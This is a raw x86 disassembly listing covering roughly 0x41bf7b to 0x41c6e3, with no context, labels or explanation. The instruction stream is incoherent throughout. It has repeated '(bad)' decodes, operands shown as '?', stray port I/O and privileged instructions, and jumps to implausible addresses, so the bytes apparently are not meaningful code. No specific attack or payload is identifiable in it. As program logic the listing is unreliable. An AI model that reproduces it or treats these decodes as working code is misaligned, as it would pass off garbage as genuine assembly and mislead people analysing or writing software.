  41bf7b:	xchg   ebx,eax
  41bf7c:	aaa    
  41bf7d:	push   ebp
  41bf7e:	ins    BYTE PTR es:[edi],dx
  41bf7f:	mov    ebx,0x78357bf
  41bf84:	jo     0x41bf72
  41bf86:	or     esi,DWORD PTR [ecx-0x3878ec8f]
  41bf8c:	repz repz and esp,edx
  41bf90:	sub    ah,0xd1
  41bf93:	mov    dh,0xce
  41bf95:	imul   ebp,ecx,0x2d12b0c6
  41bf9b:	push   esi
  41bf9c:	cmp    al,0xec
  41bf9e:	mov    al,ds:0xf0a31f71
  41bfa3:	into   
  41bfa4:	mov    ?,WORD PTR [esi-0x1216f95c]
  41bfaa:	cmp    eax,0xe08e6921
  41bfaf:	push   0x5a0033d0
  41bfb4:	xchg   edi,eax
  41bfb5:	mov    cl,BYTE PTR [edx-0x1acfecbc]
  41bfbb:	adc    dh,BYTE PTR [eax+0xfe66cb2]
  41bfc1:	pop    esp
  41bfc2:	stc    
  41bfc3:	js     0x41c029
  41bfc5:	xchg   edx,eax
  41bfc6:	sbb    al,ah
  41bfc8:	ret    0xe9b2
  41bfcb:	adc    al,0xa3
  41bfcd:	dec    esi
  41bfce:	xor    eax,0xa5235d37
  41bfd3:	fdiv   QWORD PTR [ebx]
  41bfd5:	call   0xa6113116
  41bfda:	(bad)  
  41bfdb:	sbb    ebp,ebx
  41bfdd:	xchg   esi,eax
  41bfde:	mov    ah,0x1d
  41bfe0:	sub    al,0xc1
  41bfe2:	f2xm1  
  41bfe4:	pushf  
  41bfe5:	loope  0x41bf77
  41bfe7:	jg     0x41c00c
  41bfe9:	sbb    eax,0x3cb3fcba
  41bfee:	add    DWORD PTR [eax+0x46],esp
  41bff1:	rcl    BYTE PTR [esi+0x15],0x7
  41bff5:	imul   esi,DWORD PTR [ecx],0x356d762e
  41bffb:	lock imul eax,DWORD PTR [esi],0x44
  41bfff:	cli    
  41c000:	ins    DWORD PTR es:[edi],dx
  41c001:	jbe    0x41bfe7
  41c003:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c004:	aaa    
  41c005:	(bad)  
  41c007:	data16 cmp al,0x8b
  41c00a:	dec    edx
  41c00b:	push   ecx
  41c00c:	aad    0xb1
  41c00e:	aad    0x83
  41c010:	sub    al,0x69
  41c012:	sub    cl,BYTE PTR ds:0x90388db0
  41c018:	pop    esp
  41c019:	not    BYTE PTR cs:[esi]
  41c01c:	je     0x41c020
  41c01e:	sbb    BYTE PTR [eax+0x2755cbec],cl
  41c024:	out    dx,eax
  41c025:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c026:	call   DWORD PTR ds:0x1b9b22a9
  41c02c:	mov    dh,0xfb
  41c02e:	sub    BYTE PTR [ebp+0x67528117],bl
  41c034:	and    al,BYTE PTR [edx-0x71]
  41c037:	inc    eax
  41c038:	xchg   edi,eax
  41c039:	mov    ds:0x85e4ea26,eax
  41c03e:	data16 and al,0x4e
  41c041:	jne    0x41bfd3
  41c043:	or     BYTE PTR [esi],ah
  41c045:	inc    edi
  41c046:	test   eax,0x5418f90f
  41c04b:	pop    esi
  41c04c:	push   esi
  41c04d:	jle    0x41bfe4
  41c04f:	push   0x86b363c0
  41c054:	fcomp  st(2)
  41c056:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c057:	push   esi
  41c058:	push   ds
  41c059:	pop    ds
  41c05a:	jmp    0xdc77d926
  41c05f:	add    eax,ebp
  41c061:	test   eax,0x32a9af86
  41c066:	sbb    eax,0xbda0318
  41c06b:	adc    eax,0x23d8724b
  41c070:	mov    edx,0x7ad8184e
  41c075:	and    eax,0x990a3c22
  41c07a:	sahf   
  41c07b:	ds sbb eax,0xf850f06e
  41c081:	aaa    
  41c082:	fcmovnbe st,st(6)
  41c084:	sub    al,0xfe
  41c086:	ja     0x41c047
  41c088:	jecxz  0x41c026
  41c08a:	test   eax,0xe5c7affe
  41c08f:	inc    esp
  41c090:	push   esi
  41c091:	cs jmp ecx
  41c094:	fs leave 
  41c096:	sahf   
  41c097:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c098:	cmc    
  41c099:	pop    ecx
  41c09a:	mov    ebx,DWORD PTR [ebp+0x47c49be9]
  41c0a0:	add    esi,ecx
  41c0a2:	jae    0x41c06a
  41c0a4:	loopne 0x41c064
  41c0a6:	fwait
  41c0a7:	loopne 0x41c092
  41c0a9:	xor    DWORD PTR [ecx],ecx
  41c0ab:	mov    esi,0x4499f66e
  41c0b0:	xlat   BYTE PTR ds:[ebx]
  41c0b1:	mov    ch,0x77
  41c0b3:	mov    ecx,ebp
  41c0b5:	cli    
  41c0b6:	adc    bh,al
  41c0b8:	inc    edi
  41c0b9:	test   eax,0x74fcf974
  41c0be:	mov    ds:0xcded43cc,al
  41c0c3:	sbb    dl,al
  41c0c5:	inc    ecx
  41c0c6:	mov    esp,0x57140cdd
  41c0cb:	jne    0x41c103
  41c0cd:	xor    al,0xc1
  41c0cf:	sar    DWORD PTR [ebp+0x57],1
  41c0d2:	xor    al,0x4c
  41c0d4:	or     bh,al
  41c0d6:	and    eax,0xccc16d5b
  41c0db:	xor    eax,0x260a0c84
  41c0e0:	hlt    
  41c0e1:	(bad)
  41c0e4:	lods   al,BYTE PTR ds:[esi]
  41c0e5:	(bad)  
  41c0e7:	jo     0x41c162
  41c0e9:	xchg   BYTE PTR [eax],ch
  41c0eb:	xchg   esp,eax
  41c0ec:	sti    
  41c0ed:	add    al,0x77
  41c0ef:	nop
  41c0f0:	cmc    
  41c0f1:	dec    ebx
  41c0f2:	cmp    al,0x60
  41c0f4:	dec    ebp
  41c0f5:	lahf   
  41c0f6:	cmp    eax,0x303e69cd
  41c0fb:	in     al,dx
  41c0fc:	mov    ?,esp
  41c0fe:	repnz ins DWORD PTR es:[edi],dx
  41c100:	retf   
  41c101:	retf   0xab0a
  41c104:	xor    BYTE PTR [edx+0x6c],bl
  41c107:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c108:	repnz fst QWORD PTR [ecx+edx*4-0x30ee221e]
  41c110:	out    dx,al
  41c111:	pop    edx
  41c112:	add    bl,BYTE PTR [ecx-0x6d]
  41c115:	addr16 push ecx
  41c117:	mov    edx,cs
  41c119:	(bad)  
  41c11a:	lock adc cl,BYTE PTR [ecx-0x71]
  41c11e:	mov    ?,WORD PTR [esi+0x7b]
  41c121:	scas   al,BYTE PTR es:[edi]
  41c122:	jp     0x41c0e6
  41c124:	stos   DWORD PTR es:[edi],eax
  41c125:	push   edi
  41c126:	dec    esi
  41c127:	sub    eax,0x6d117612
  41c12c:	mov    ds:0x8a2d521c,al
  41c131:	inc    eax
  41c132:	rcr    BYTE PTR [edx-0x78],0xe9
  41c136:	inc    ebp
  41c137:	cdq    
  41c138:	arpl   WORD PTR [ebx],ax
  41c13a:	jnp    0x41c191
  41c13c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c13d:	in     al,0x8a
  41c13f:	mov    ah,0x1b
  41c141:	sub    al,0x21
  41c143:	and    DWORD PTR [edx-0x28],eax
  41c146:	xchg   esi,eax
  41c147:	sbb    ecx,DWORD PTR [esi+0x1d]
  41c14a:	ins    BYTE PTR es:[edi],dx
  41c14b:	mov    ah,0x47
  41c14d:	bound  ebx,QWORD PTR [esi]
  41c14f:	add    cl,bl
  41c151:	das    
  41c152:	pop    edx
  41c153:	jnp    0x41c1c9
  41c155:	push   cs
  41c156:	cmp    cl,cl
  41c158:	push   0xffffffb7
  41c15a:	test   edi,esp
  41c15c:	fcom   QWORD PTR [esi-0x32]
  41c15f:	pop    esp
  41c160:	pop    eax
  41c161:	mov    ds:0xc04ee28c,eax
  41c166:	sti    
  41c167:	xor    eax,0x9f09953e
  41c16c:	push   es
  41c16d:	enter  0x6a07,0x51
  41c171:	sbb    DWORD PTR [ecx-0x3a6c4b50],eax
  41c177:	push   ebp
  41c178:	leave  
  41c179:	iret   
  41c17a:	(bad)  
  41c17b:	call   0x1b2ac57c
  41c180:	into   
  41c181:	int3   
  41c182:	and    eax,0x5e309ac3
  41c187:	out    dx,al
  41c188:	not    BYTE PTR [ebx-0x4f85ef3d]
  41c18e:	outs   dx,DWORD PTR ds:[esi]
  41c18f:	mov    edi,0x53045b88
  41c194:	jo     0x41c195
  41c196:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c197:	add    BYTE PTR [esi],bh
  41c199:	or     al,0x8f
  41c19b:	stos   BYTE PTR es:[edi],al
  41c19c:	loop   0x41c141
  41c19e:	arpl   WORD PTR [ecx+eax*2+0x4ff3c14a],cx
  41c1a5:	outs   dx,BYTE PTR ds:[esi]
  41c1a6:	xchg   ecx,eax
  41c1a7:	ja     0x41c1d7
  41c1a9:	push   esi
  41c1aa:	jo     0x41c130
  41c1ac:	xor    esi,DWORD PTR [edx-0x3f]
  41c1af:	add    eax,0xde712c61
  41c1b4:	mov    ch,0x89
  41c1b6:	mov    ecx,0xad224f97
  41c1bb:	dec    eax
  41c1bc:	into   
  41c1bd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1be:	and    BYTE PTR [edx-0x5c941498],bh
  41c1c4:	push   cs
  41c1c5:	push   cs
  41c1c6:	(bad)  
  41c1c7:	outs   dx,BYTE PTR ds:[esi]
  41c1c8:	or     BYTE PTR [ebx-0xb],cl
  41c1cb:	outs   dx,BYTE PTR ds:[esi]
  41c1cc:	jb     0x41c1d5
  41c1ce:	ss push ecx
  41c1d0:	ins    BYTE PTR es:[edi],dx
  41c1d1:	push   ebp
  41c1d2:	push   0x5b
  41c1d4:	sub    DWORD PTR [edi],edi
  41c1d6:	inc    esi
  41c1d7:	sub    DWORD PTR [esi-0x5048dc2d],esp
  41c1dd:	mov    cl,ah
  41c1df:	sbb    eax,0x743f700d
  41c1e4:	pop    edi
  41c1e5:	add    eax,0x975890c3
  41c1ea:	dec    ebp
  41c1eb:	xor    al,0xb3
  41c1ed:	jmp    0xa24e6ffc
  41c1f2:	inc    ebx
  41c1f3:	ins    BYTE PTR es:[edi],dx
  41c1f4:	lock mov ecx,0xc26df1f9
  41c1fa:	popa   
  41c1fb:	and    esp,DWORD PTR [ebx-0x40]
  41c1fe:	inc    eax
  41c1ff:	out    dx,eax
  41c200:	inc    ebx
  41c201:	mov    ch,0x1c
  41c203:	ret    0x2e03
  41c206:	cwde   
  41c207:	dec    ebx
  41c208:	adc    BYTE PTR [eax+esi*1],ah
  41c20b:	fcom   QWORD PTR [ebp-0x4b]
  41c20e:	imul   ebx,DWORD PTR [eax],0xb8455987
  41c214:	jp     0x41c1ae
  41c216:	pop    ecx
  41c217:	int3   
  41c218:	repz aad 0x7a
  41c21b:	ds mov al,0x2b
  41c21e:	outs   dx,DWORD PTR ds:[esi]
  41c21f:	cmp    eax,0x86ff4f64
  41c224:	or     al,bl
  41c226:	fwait
  41c227:	div    DWORD PTR [edi-0x43cedc17]
  41c22d:	test   eax,0x55035703
  41c232:	das    
  41c233:	popf   
  41c234:	inc    ebx
  41c235:	frstor [ebx-0x5b296317]
  41c23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c23c:	and    BYTE PTR [ebp+0x17],ch
  41c23f:	jbe    0x41c252
  41c241:	into   
  41c242:	mov    DWORD PTR [ecx+eiz*4-0x46],0x649d6e04
  41c24a:	pop    ebx
  41c24b:	enter  0x7580,0xc5
  41c24f:	int    0x60
  41c251:	outs   dx,DWORD PTR ds:[esi]
  41c252:	mov    eax,ecx
  41c254:	pop    ds
  41c255:	inc    edi
  41c256:	pop    ebx
  41c257:	or     al,0xf3
  41c259:	pop    esi
  41c25a:	jl     0x41c299
  41c25c:	sbb    eax,0x7e3fa9fc
  41c261:	adc    BYTE PTR [edx+esi*8-0x5241ddbe],al
  41c268:	mov    eax,ds:0x638792ff
  41c26d:	loopne 0x41c22b
  41c26f:	in     al,0x74
  41c271:	pop    ss
  41c272:	cmp    ah,bl
  41c274:	fimul  DWORD PTR [ebp+0x3d2add08]
  41c27a:	mov    WORD PTR [ebp+0x2d811644],es
  41c280:	jne    0x41c27e
  41c282:	cli    
  41c283:	mov    esp,0xc57421ca
  41c288:	jo     0x41c23a
  41c28a:	add    ebx,DWORD PTR [eax+ecx*8-0x7f52bc52]
  41c291:	call   0x1822d2a5
  41c296:	sbb    DWORD PTR [edi+0x52],esi
  41c299:	pop    ss
  41c29a:	loopne 0x41c280
  41c29c:	xor    eax,0x441a3ee3
  41c2a1:	jne    0x41c2b3
  41c2a3:	mov    ah,0xa1
  41c2a5:	call   DWORD PTR [eax+0x25]
  41c2a8:	in     eax,dx
  41c2a9:	sub    DWORD PTR [eax],ebp
  41c2ab:	test   al,0xea
  41c2ad:	jg     0x41c2d9
  41c2af:	xchg   esp,eax
  41c2b0:	es cmp dh,cl
  41c2b3:	cmp    al,0x5d
  41c2b5:	jno    0x41c2ee
  41c2b7:	test   DWORD PTR [edi+0x5efbdb4f],0x9e2ecc90
  41c2c1:	adc    al,0xac
  41c2c3:	out    0x37,al
  41c2c5:	popa   
  41c2c6:	gs int 0x82
  41c2c9:	or     BYTE PTR [ebx],0xb
  41c2cc:	jecxz  0x41c25b
  41c2ce:	and    eax,0x418d45a6
  41c2d3:	mov    eax,ds:0x1a6b137b
  41c2d8:	xchg   ebp,eax
  41c2d9:	sbb    DWORD PTR [edx],ebx
  41c2db:	repz adc DWORD PTR [edx-0x60],esp
  41c2df:	xor    BYTE PTR [edi-0x205435af],dl
  41c2e5:	adc    al,0x33
  41c2e7:	sub    bl,BYTE PTR [eax-0x22ad24de]
  41c2ed:	mov    edi,0x50243e88
  41c2f2:	or     DWORD PTR [ebx],esp
  41c2f4:	je     0x41c2c1
  41c2f6:	jno    0x41c34f
  41c2f8:	xchg   ebp,eax
  41c2f9:	pop    ds
  41c2fa:	xor    BYTE PTR [eax-0x55],bl
  41c2fd:	mov    ebx,0x980a98f4
  41c302:	int    0x8c
  41c304:	sub    al,0xe3
  41c306:	std    
  41c307:	enter  0x8486,0xa9
  41c30b:	out    dx,eax
  41c30c:	fs inc ecx
  41c30e:	jbe    0x41c307
  41c310:	jl     0x41c374
  41c312:	(bad)  
  41c313:	or     ecx,DWORD PTR [ecx]
  41c315:	push   cs
  41c316:	pushf  
  41c317:	sub    al,0x41
  41c319:	pop    ebp
  41c31a:	adc    cl,al
  41c31c:	(bad)  
  41c31d:	ss dec esi
  41c31f:	ins    BYTE PTR es:[edi],dx
  41c320:	loopne 0x41c2a6
  41c322:	rcr    BYTE PTR [eax-0x25],0x97
  41c326:	pop    esp
  41c327:	cmp    BYTE PTR [eax-0x7c8e258a],dl
  41c32d:	out    0xcb,eax
  41c32f:	in     al,0x4e
  41c331:	scas   al,BYTE PTR es:[edi]
  41c332:	pop    ebx
  41c333:	out    dx,eax
  41c334:	adc    eax,0x5713d328
  41c339:	arpl   WORD PTR [edx+0x76],bx
  41c33c:	test   DWORD PTR [esi+0xdb5a79],ecx
  41c342:	pop    ebx
  41c343:	mov    esp,ebp
  41c345:	adc    al,0x53
  41c347:	mov    ecx,0x9233759d
  41c34c:	pop    esi
  41c34d:	jne    0x41c37e
  41c34f:	imul   edi,DWORD PTR [eax+0x37],0x30
  41c353:	cmp    eax,0xc8f2e43b
  41c358:	sub    BYTE PTR [edi+0xac07e0],ch
  41c35e:	ss stc 
  41c360:	ja     0x41c3d8
  41c362:	sub    al,0x28
  41c364:	shl    DWORD PTR [ebp+0x6884ef8e],1
  41c36a:	xor    cl,BYTE PTR [ebx]
  41c36c:	icebp  
  41c36d:	cwd    
  41c36f:	sub    edi,ebx
  41c371:	fwait
  41c372:	imul   ecx,DWORD PTR [ecx+0x3b],0xd
  41c376:	jnp    0x41c377
  41c378:	icebp  
  41c379:	mov    eax,ds:0x3d1f2e39
  41c37e:	(bad)  
  41c37f:	jl     0x41c343
  41c381:	pop    eax
  41c382:	inc    ebx
  41c383:	mov    edi,0x38f72bc
  41c388:	mov    ch,0xf2
  41c38a:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c38c:	pop    edx
  41c38d:	xor    esp,esp
  41c38f:	jp     0x41c311
  41c391:	aam    0x2a
  41c393:	fisttp DWORD PTR [esi]
  41c395:	in     eax,0xc5
  41c397:	add    DWORD PTR [eax+0x189c20b7],0x5b73363f
  41c3a1:	pop    ebx
  41c3a2:	push   0x2b
  41c3a4:	push   esp
  41c3a5:	and    eax,0x3c069e78
  41c3aa:	(bad)  
  41c3ab:	fcmovnb st,st(3)
  41c3ad:	pop    edx
  41c3ae:	fisttp DWORD PTR [ebx]
  41c3b0:	inc    eax
  41c3b1:	pusha  
  41c3b2:	shl    DWORD PTR [edi+0x22d71dfa],1
  41c3b8:	jmp    0x41c352
  41c3ba:	lahf   
  41c3bb:	inc    eax
  41c3bc:	mov    edi,0x601a64c1
  41c3c1:	inc    eax
  41c3c2:	mov    al,0xbe
  41c3c4:	arpl   dx,di
  41c3c6:	sbb    cl,dl
  41c3c8:	fwait
  41c3c9:	cdq    
  41c3ca:	sub    BYTE PTR [edx+0xb],bh
  41c3cd:	mov    esp,0xea88c2c
  41c3d2:	iret   
  41c3d3:	inc    cx
  41c3d5:	or     BYTE PTR [edx],bl
  41c3d7:	pusha  
  41c3d8:	ins    DWORD PTR es:[edi],dx
  41c3d9:	mov    ecx,DWORD PTR [esi+0x34]
  41c3dc:	adc    ebp,ebx
  41c3de:	mov    eax,ds:0x6de24251
  41c3e3:	jge    0x41c396
  41c3e5:	pop    ebx
  41c3e6:	pop    esp
  41c3e7:	xchg   ecx,eax
  41c3e8:	test   DWORD PTR [ebx],ebx
  41c3ea:	fadd   QWORD PTR [edx-0xbdf8a0a]
  41c3f0:	or     DWORD PTR [edx],ebx
  41c3f2:	cmp    DWORD PTR [ebx+0x2f45133a],edi
  41c3f8:	gs ins BYTE PTR es:[edi],dx
  41c3fa:	mov    ebx,0xd876d741
  41c3ff:	retf   0x3fd6
  41c402:	push   ecx
  41c403:	sbb    al,0xd8
  41c405:	enter  0x5c46,0xc7
  41c409:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c40a:	push   esi
  41c40b:	shld   DWORD PTR [esi-0x20b5083d],esi,cl
  41c412:	sbb    eax,DWORD PTR [ecx]
  41c414:	js     0x41c43f
  41c416:	dec    edi
  41c417:	xchg   edx,eax
  41c418:	sbb    bh,dh
  41c41a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c41b:	in     al,0xcb
  41c41d:	jnp    0x41c412
  41c41f:	add    al,0x3c
  41c421:	jmp    0x41c496
  41c423:	mov    eax,0x757602f0
  41c428:	or     esi,DWORD PTR [edx-0x3af9ff2f]
  41c42e:	pushf  
  41c42f:	imul   ebx,DWORD PTR [ebx-0x4d02f0c1],0x33964633
  41c439:	popf   
  41c43a:	and    eax,0x2d47ea0d
  41c43f:	loope  0x41c4c0
  41c441:	ins    BYTE PTR es:[edi],dx
  41c442:	loope  0x41c3d6
  41c444:	sub    eax,DWORD PTR [ebx+0x38]
  41c447:	imul   esp,DWORD PTR [edx],0xef1d48fe
  41c44d:	fidivr WORD PTR [ebp-0x17]
  41c450:	jne    0x41c3dd
  41c452:	and    DWORD PTR [ebx+0x6a838998],eax
  41c458:	gs pop edi
  41c45a:	jp     0x41c48b
  41c45c:	push   ecx
  41c45d:	repnz sbb edi,DWORD PTR [ebx-0x28]
  41c461:	sar    BYTE PTR [ebp+0x3a],1
  41c464:	repz or edi,esp
  41c467:	pop    eax
  41c468:	mov    WORD PTR [ebx-0x6c],ds
  41c46b:	int3   
  41c46c:	mov    esi,0x3dfcbac2
  41c471:	pop    es
  41c472:	pop    edi
  41c473:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c474:	pop    eax
  41c475:	sahf   
  41c476:	jns    0x41c4b4
  41c478:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c479:	push   ecx
  41c47a:	mov    eax,ds:0xb7c18218
  41c47f:	punpckldq mm6,DWORD PTR [eax]
  41c482:	aas    
  41c483:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c484:	mul    DWORD PTR [edi+0x49d967d7]
  41c48a:	mov    ecx,0x89f8d4fd
  41c490:	mov    WORD PTR [ebx+0x21],cs
  41c493:	push   cs
  41c494:	and    DWORD PTR [edx+0x712a27e9],0x5c1aee9e
  41c49e:	loop   0x41c48f
  41c4a0:	xchg   DWORD PTR [eax+edi*8],edi
  41c4a3:	enter  0x1685,0xd0
  41c4a7:	dec    esi
  41c4a8:	mov    dh,0x55
  41c4aa:	sbb    al,0xc4
  41c4ac:	mov    DWORD PTR [eax],0x4abd03de
  41c4b2:	sbb    al,0x33
  41c4b4:	sbb    ebp,DWORD PTR [esi]
  41c4b6:	push   es
  41c4b7:	ins    BYTE PTR es:[edi],dx
  41c4b8:	ret    0x66e2
  41c4bb:	adc    BYTE PTR [eax-0x44],0x62
  41c4bf:	pushf  
  41c4c0:	(bad)  
  41c4c1:	fmul   DWORD PTR [esi*2-0x6aff671b]
  41c4c8:	das    
  41c4c9:	jne    0x41c53b
  41c4cb:	xchg   ebp,eax
  41c4cc:	lods   eax,DWORD PTR ds:[esi]
  41c4cd:	fwait
  41c4ce:	shl    BYTE PTR [esi],0x5d
  41c4d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c4d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c4d3:	icebp  
  41c4d4:	jne    0x41c4d4
  41c4d6:	fisubr DWORD PTR [ebx-0x3b]
  41c4d9:	jl     0x41c4d8
  41c4db:	mov    al,ds:0x87bb86f
  41c4e0:	mov    ecx,0x38044b8d
  41c4e5:	das    
  41c4e6:	inc    eax
  41c4e7:	fcomp  DWORD PTR [edx]
  41c4e9:	mov    bl,0x9d
  41c4eb:	jg     0x41c4cb
  41c4ed:	ins    BYTE PTR es:[edi],dx
  41c4ee:	bound  esp,QWORD PTR [eax]
  41c4f0:	mov    DWORD PTR [ebp+0x38],edi
  41c4f3:	(bad)  
  41c4f4:	sub    BYTE PTR [edx],ch
  41c4f6:	mov    ecx,0xa06b2989
  41c4fb:	xor    DWORD PTR [ebx],ecx
  41c4fd:	jb     0x41c500
  41c4ff:	(bad)  
  41c500:	rol    BYTE PTR [eax+eax*4-0x16],cl
  41c504:	dec    esi
  41c505:	in     eax,0xbb
  41c507:	and    eax,0x495267d2
  41c50c:	in     eax,dx
  41c50d:	idiv   DWORD PTR [edx-0x362a3273]
  41c513:	rcl    BYTE PTR [ecx+0x7a],cl
  41c516:	outs   dx,DWORD PTR ds:[esi]
  41c517:	neg    BYTE PTR [eax-0x7e488883]
  41c51d:	faddp  st(6),st
  41c51f:	xor    eax,0x1925cae7
  41c524:	ja     0x41c578
  41c526:	push   cs
  41c527:	int3   
  41c528:	xchg   ebp,eax
  41c529:	xor    ah,BYTE PTR [ebp+0x75]
  41c52c:	(bad)  
  41c52d:	pop    edi
  41c52e:	mov    BYTE PTR ds:0xecba2337,ah
  41c534:	adc    eax,0xd15d7d76
  41c539:	mov    eax,0x8709cfa7
  41c53e:	fidivr WORD PTR [eax+0x7be03ced]
  41c544:	inc    ebp
  41c545:	imul   ebp,esi,0x9292e26f
  41c54b:	lock inc ebp
  41c54d:	call   0x87b1:0xba61b498
  41c554:	inc    ebx
  41c555:	xor    BYTE PTR [ebx-0xf09282c],al
  41c55b:	not    BYTE PTR [ebx+0x78]
  41c55e:	test   eax,0x402c20e9
  41c563:	cwde   
  41c564:	mov    ch,0x10
  41c566:	loope  0x41c560
  41c568:	add    DWORD PTR [ebp-0x48],0xffffffd6
  41c56c:	mov    bh,0xa6
  41c56e:	jp     0x41c5cc
  41c570:	mov    esi,0x8dbfd8f7
  41c575:	test   DWORD PTR gs:[ebp-0x4ad22a8f],eax
  41c57c:	xchg   DWORD PTR [esi],esi
  41c57e:	cmp    al,0xa8
  41c580:	add    bh,BYTE PTR [ecx+0x4e]
  41c583:	shl    DWORD PTR [esi+edx*1-0x7a],cl
  41c587:	push   ecx
  41c588:	xchg   esp,eax
  41c589:	adc    al,0x24
  41c58b:	clc    
  41c58c:	cmp    ch,ch
  41c58e:	in     eax,dx
  41c58f:	pushf  
  41c590:	in     al,dx
  41c591:	or     esi,edi
  41c593:	mov    edx,0x108e3643
  41c598:	inc    BYTE PTR [edi]
  41c59a:	ret    
  41c59b:	push   ebx
  41c59c:	mov    ah,0x1f
  41c59e:	cmp    ebx,0x43
  41c5a1:	cld    
  41c5a2:	sbb    esi,DWORD PTR cs:[ebx]
  41c5a5:	cwde   
  41c5a6:	push   cs
  41c5a7:	jnp    0x41c58f
  41c5a9:	aas    
  41c5aa:	xchg   BYTE PTR [esi-0x19b3e057],dh
  41c5b0:	stos   BYTE PTR es:[edi],al
  41c5b1:	jbe    0x41c53a
  41c5b3:	(bad)  
  41c5b4:	fsubr  DWORD PTR [esi-0x6e]
  41c5b7:	pop    eax
  41c5b8:	push   ds
  41c5b9:	pop    ss
  41c5ba:	mov    ds:0xefb3e45a,al
  41c5bf:	xor    eax,0x204c44c8
  41c5c4:	ss push es
  41c5c6:	push   edi
  41c5c7:	jbe    0x41c5d7
  41c5c9:	jmp    0x59230927
  41c5ce:	mov    ah,ch
  41c5d0:	sbb    bh,BYTE PTR [edx]
  41c5d2:	cmp    al,0xf4
  41c5d4:	sub    eax,0x9b31fd64
  41c5d9:	pop    edx
  41c5da:	mov    ch,0x6b
  41c5dc:	mov    al,0xb6
  41c5de:	inc    esp
  41c5df:	xchg   ebx,eax
  41c5e0:	sub    ah,al
  41c5e2:	dec    edx
  41c5e3:	jb     0x41c65d
  41c5e5:	ret    0x1c39
  41c5e8:	xchg   DWORD PTR [esi+0x744540f1],esi
  41c5ee:	dec    ebp
  41c5ef:	ret    
  41c5f0:	cs mov cl,0xc9
  41c5f3:	xor    eax,0x5283360e
  41c5f8:	adc    DWORD PTR [esi-0x16],esi
  41c5fb:	push   esi
  41c5fc:	jl     0x41c62d
  41c5fe:	jmp    0xb36:0xa5acc47
  41c605:	ss inc esp
  41c607:	sub    DWORD PTR [ecx+edx*8-0x61],ecx
  41c60b:	enter  0x3ded,0xe
  41c60f:	test   al,0x2e
  41c611:	xchg   edx,eax
  41c612:	aad    0xf8
  41c614:	lahf   
  41c615:	pop    es
  41c616:	pop    ds
  41c617:	div    DWORD PTR [ebp-0x15fec4ba]
  41c61d:	push   edx
  41c61e:	jg     0x41c5f7
  41c620:	xor    BYTE PTR [edx-0x62],0xb3
  41c624:	mov    esi,0xb88dcf3
  41c629:	mov    BYTE PTR [edi-0x2bffe9ae],bh
  41c62f:	pop    edi
  41c630:	in     eax,dx
  41c631:	inc    edi
  41c632:	sbb    DWORD PTR [edx-0x65336f55],esi
  41c638:	adc    esi,DWORD PTR [edi]
  41c63a:	xor    eax,0xffffffef
  41c63d:	bound  ecx,QWORD PTR [edi+edi*1-0x7d9a6c0d]
  41c644:	cs dec ebx
  41c646:	fld    QWORD PTR [eax+esi*2]
  41c649:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c64a:	sbb    cl,ch
  41c64c:	gs xchg bh,bl
  41c64f:	adc    eax,0xf9852418
  41c654:	les    esp,FWORD PTR [edi]
  41c656:	mov    WORD PTR [edx+0x8],?
  41c659:	inc    ebx
  41c65a:	pop    ebx
  41c65b:	lods   eax,DWORD PTR ds:[esi]
  41c65c:	mov    cl,0x72
  41c65e:	lock cmp bh,BYTE PTR [eax]
  41c661:	test   BYTE PTR [edi+eiz*1+0x36c99e72],dl
  41c668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c669:	inc    edi
  41c66a:	retf   0x54bc
  41c66d:	repz and al,0x45
  41c670:	sub    BYTE PTR [ecx-0x4d],bl
  41c673:	add    bh,BYTE PTR [edx+0x7e]
  41c676:	or     BYTE PTR [edi-0x1a9efe56],ch
  41c67c:	sub    eax,DWORD PTR [esi+edi*2+0x4ecbe608]
  41c683:	push   ds
  41c684:	test   eax,0xe2d84ea3
  41c689:	ret    0x1ddf
  41c68c:	cmp    BYTE PTR [ecx],dh
  41c68e:	dec    esi
  41c68f:	dec    edi
  41c690:	aas    
  41c691:	das    
  41c692:	push   ebx
  41c693:	popf   
  41c694:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c695:	in     eax,0xb0
  41c697:	aam    0xbd
  41c699:	bound  ebp,QWORD PTR [eax-0x5b0ef956]
  41c69f:	ins    BYTE PTR es:[edi],dx
  41c6a0:	or     ah,ah
  41c6a2:	fnsave [eax]
  41c6a4:	sar    bh,cl
  41c6a6:	xor    al,0x39
  41c6a8:	js     0x41c66e
  41c6aa:	and    DWORD PTR [esi+0x4a],ecx
  41c6ad:	paddsw mm5,QWORD PTR [esp+eax*2+0xc7e17b4]
  41c6b5:	stos   DWORD PTR es:[edi],eax
  41c6b6:	xchg   esi,eax
  41c6b7:	js     0x41c671
  41c6b9:	retf   0x12c0
  41c6bc:	iret   
  41c6bd:	aaa    
  41c6be:	in     al,dx
  41c6bf:	lahf   
  41c6c0:	mov    dh,0xc7
  41c6c2:	loope  0x41c6d3
  41c6c4:	hlt    
  41c6c5:	jge    0x41c740
  41c6c7:	mov    al,ds:0x9eedd775
  41c6cc:	rcr    DWORD PTR [esp+ecx*4+0x5a9a80b8],0x82
  41c6d4:	in     eax,dx
  41c6d5:	js     0x41c66c
  41c6d7:	pusha  
  41c6d8:	xchg   esi,eax
  41c6d9:	add    al,0x65
  41c6db:	cmp    ebp,DWORD PTR [edx-0x30]
  41c6de:	inc    edx
  41c6df:	sbb    BYTE PTR [eax+0x6a],ch
  41c6e2:	into   
  41c6e3:	loop   0x41c66b
